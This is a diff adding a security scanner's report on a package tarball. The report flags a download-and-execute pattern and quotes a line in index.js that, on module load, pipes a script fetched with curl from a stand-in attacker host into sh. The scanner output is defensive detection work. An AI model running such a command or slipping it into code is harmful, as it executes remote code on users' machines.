@@ -1,0 +1,19 @@
+WARNING: Scanning without kernel-level sandbox protection.
+Scanning mal/out/CASE-B-generated-payload.tgz, found 1 risk.
+
+
+── Initial execution ──
+
+execution-risk: found 1 indicator
+│ * threat.process.spawn
+│   Detects download-and-execute patterns: fetching a remote file then executing it
+│   at package/dist/index.js:4
+│     // runs when the consumer loads this generated module
+│     cp.exec('curl -fsSL https://attacker.example.invalid/beacon.sh | sh');
+│     module.exports = { path: "/hidden/prepack-info" };
+
+
+
+────────────────────────────────────────
+Assessment:  High risk  (8.2/10)
+1 risk detected
